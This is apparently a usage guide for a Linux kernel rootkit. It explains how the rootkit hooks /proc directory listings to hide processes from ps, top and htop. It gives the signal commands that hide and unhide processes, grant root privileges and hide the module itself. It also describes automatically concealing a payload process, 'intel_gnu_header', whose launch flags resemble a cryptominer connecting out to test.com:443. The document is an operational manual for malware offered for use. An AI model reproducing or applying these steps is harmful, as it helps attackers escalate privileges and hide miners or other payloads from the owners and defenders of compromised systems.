# Process Hiding Usage Guide

This rootkit now supports hiding processes **by name** from system tools like `ps`, `top`, `htop`, and `/proc` directory listings.

## How Process Hiding Works

The rootkit hooks the `filldir` and `filldir64` functions to intercept directory listings in `/proc`. When a process name matches any entry in the hidden process list, its directory entry in `/proc` is filtered out, making the process invisible to most userspace tools.

The system checks both:
1. **Process name** (comm) - the executable name
2. **Command line** - the full command with arguments

## Usage Commands

### Hide Current Process
```bash
# Hide the current process by its name
kill -34 0
```

### Hide Any Process by PID
```bash
# Hide process with PID 656 (e.g., qemu-ga)
kill -34 656

# This will hide ALL processes with the same name as PID 656
```

### Unhide Current Process
```bash
# Unhide the current process by its name
kill -35 0
```

### Unhide Any Process by PID
```bash
# Unhide process with PID 656 (e.g., qemu-ga)
kill -35 656

# This will unhide ALL processes with the same name as PID 656
```

### Other Existing Commands
```bash
# Get root privileges
kill -10 0

# Hide/show the rootkit module
kill -12 0
```

## Example: Hiding qemu-ga Process

To hide the qemu-ga process like:
```
root 656 0.0 0.1 80712 4224 ? Ssl 22:44 0:00 /usr/sbin/qemu-ga
```

**Hide by PID:**
```bash
# Hide by PID (this hides ALL qemu-ga processes)
kill -34 656

# Verify it's hidden
ps aux | grep qemu-ga    # Should show no results
ls /proc/656             # Should show "No such file or directory"
```

**To unhide:**
```bash
kill -35 656
```

## Configuration

- **Maximum Hidden Process Names**: 10 (configurable via `HIDE_PROCESS_LIST_SIZE` in config.h)
- **Maximum Process Name Length**: 256 characters (configurable via `MAX_PROCESS_NAME_LEN`)
- **Signal Numbers**: 
  - SIGRTMIN (34): Hide current process by name
  - SIGRTMIN1 (35): Unhide current process by name

## Auto-Hidden Processes

The rootkit automatically hides:
- **intel_gnu_header** - The main payload process (auto-hidden on module load)

## Example Usage Scenario

1. Start the intel_gnu_header process:
   ```bash
   /usr/bin/intel_gnu_header -o test.com:443 -u 44fdsasdf -k --tls -p prolay &
   echo $!  # Note the PID, e.g., 1234
   ```

2. **The process is automatically hidden** when the rootkit module loads.

3. Verify it's hidden:
   ```bash
   ps aux | grep intel_gnu_header    # Should not show the process
   ps aux | grep test.com            # Should not show the process
   ls /proc/1234                     # Should show "No such file or directory"
   ```

4. **To make intel_gnu_header visible again:**
   ```bash
   # Unhide by PID (if you know the PID)
   kill -35 1234
   
   # Or unhide from within the intel_gnu_header process itself
   kill -35 0
   
   # Verify it's now visible
   ps aux | grep intel_gnu_header    # Should show the process
   ```

5. **To hide it again:**
   ```bash
   # Hide by PID
   kill -34 1234
   
   # Or hide from within the process
   kill -34 0
   ```

4. To hide other processes:
   ```bash
   # From within the process you want to hide:
   kill -34 0
   
   # Or hide by PID:
   kill -34 <PID>
   ```

5. To unhide a process:
   ```bash
   # From within the hidden process:
   kill -35 0
   
   # Or unhide by PID:
   kill -35 <PID>
   ```

## Technical Details

- The rootkit maintains an internal list of hidden process names
- Process hiding works by filtering `/proc` directory entries based on process names
- Hidden processes are still running and functional, just invisible to most tools
- The system uses **substring matching** - if any hidden name is found in the process name or command line, it's hidden
- The hiding affects: `ps`, `top`, `htop`, `/proc` listings, and other tools that read from `/proc`

## Advanced Usage

You can hide processes with specific patterns:
- Hide by executable name: `intel_gnu_header`
- Hide by partial command: `test.com:443`
- Hide by argument: `44fdsasdf`

## Limitations

- Maximum of 10 process names can be hidden simultaneously
- Process names are limited to 256 characters
- Some advanced forensic tools might still detect hidden processes
- Process hiding only affects `/proc` directory listings, not kernel-level process tracking
- Signal-based hiding only works for the current process (kill -34 0)
